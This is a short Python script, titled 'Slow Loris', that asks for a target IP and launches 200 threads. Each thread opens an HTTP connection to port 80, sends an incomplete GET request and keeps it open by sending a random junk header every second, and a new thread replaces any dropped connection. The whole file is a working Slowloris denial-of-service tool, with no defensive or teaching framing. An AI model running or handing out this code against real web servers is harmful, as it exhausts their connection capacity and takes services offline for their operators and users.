import _thread
import socket
import time
import random

ip = input("IP to connect to: ")
user_agent = "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0"


def lorisThread(threadname, address):
    print("Starting thread")
    s = socket.socket()
    s.connect((address, 80))

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
    s.send("User-Agent: {}\r\n".format(user_agent).encode("utf-8"))
    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    print("Sent request")

    while True:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            time.sleep(1)
            print('Sent.')
        except ConnectionAbortedError:
            _thread.start_new_thread(lorisThread, ("name", ip))


print("Slow Loris")
try:
    for i in range(0, 200):
        _thread.start_new_thread(lorisThread, ("name", ip))
except socket.error:
    print("unable to start thread")


while True:
    pass
